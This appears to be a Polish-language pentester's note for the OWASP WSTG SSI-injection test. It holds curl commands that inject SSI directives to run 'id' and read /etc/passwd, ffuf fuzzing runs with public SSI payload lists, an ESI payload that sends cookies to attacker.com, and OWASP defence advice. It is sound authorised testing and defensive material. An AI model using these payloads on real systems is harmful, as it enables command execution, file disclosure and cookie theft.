# WSTG-INPV-08 — Testing for SSI Injection

## Cele

- Identify SSI injection points
- Assess the severity of the injection

## KOMENDY

### Reczne testowanie SSI

```bash
curl -s "https://TARGET/page?name=<!--#echo var=\"DATE_LOCAL\"-->"
curl -s "https://TARGET/page?name=<!--#exec cmd=\"id\"-->"
curl -s "https://TARGET/page?name=<!--#include virtual=\"/etc/passwd\"-->"
curl -s "https://TARGET/page?name=<!--#config errmsg=\"SSI_DETECTED\"-->"

```

### Sprawdzenie czy serwer obsluguje SSI

```bash
curl -sI "https://TARGET/" | grep -i "server"
# Apache z mod_include, Nginx z ssi on, IIS z SSI

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings SSI payloads

```bash
ffuf -u "https://TARGET/page?name=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Server Side Include Injection/Files/ssi_esi.txt" -mc all -o output_ffuf_ssi.json

```

### SecLists SSI

```bash
ffuf -u "https://TARGET/page?name=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/SSI-Injection-Jhaddix.txt -mc all -o output_ffuf_seclists_ssi.json

```

### fuzzdb SSI

```bash
ffuf -u "https://TARGET/page?name=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/server-side-include/SSI-Injection.txt -mc all -o output_ffuf_fuzzdb_ssi.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Sprawdz czy serwer uzywa SSI (pliki .shtml, .shtm, .stm)
2. Testuj wstrzykiwanie SSI dyrektyw w parametrach i formularzach
3. Sprawdz ESI (Edge Side Includes) jesli jest CDN/Varnish
4. Uzyj Burp Repeater do testowania roznych dyrektyw SSI


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md

### SSI Injection — czym jest

- Server Side Includes: dyrektywy w HTML procesowane przez serwer przed wyslaniem do klienta
- Atakujacy wstrzykuje dyrektywy SSI: `<!--#exec cmd="id"-->`, `<!--#include virtual="/etc/passwd"-->`
- Pliki SSI: `.shtml`, `.shtm`, `.stm` — sprawdz czy serwer je przetwarza

### ESI Injection (Edge Side Includes)

- ESI: dyrektywy procesowane przez reverse proxy/CDN (Varnish, Akamai, Squid)
- Payload: `<esi:include src="http://attacker.com/steal?cookie=$(HTTP_COOKIE)"/>`
- Niebezpieczne bo procesowane na warstwie infrastruktury — WAF moze nie wykryc

### Obrona

- **Wylacz SSI** jesli nie sa wymagane — najlepsza obrona
- **Input validation**: odrzuc znaki `<!--`, `-->`, `#` w danych uzytkownika
- **Allowlist dyrektyw**: jesli SSI wymagane — jawnie okresl dozwolone dyrektywy
- **Ogranicz uprawnienia** procesu serwera WWW — minimalne prawa do filesystem
- **ESI**: wylacz procesowanie ESI na proxy/CDN jesli nie uzywane
- **Output encoding**: enkoduj dane uzytkownika przed wstawieniem do szablonow SSI

### Input Validation — ogolne zasady

- **Allowlist** (biala lista) zamiast **denylist** (czarna lista) — okresl co jest dozwolone
- Waliduj: typ danych, dlugosc, zakres, format (regex)
- Walidacja jest **dodatkowa warstwa** — nie zastepuje output encoding ani parameterized queries
- Waliduj po stronie SERWERA — client-side validation to UX, nie security

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Active Scan++ | Rozszerzony skaner z checkami SSI injection | [GitHub](https://github.com/albinowax/ActiveScanPlusPlus) |
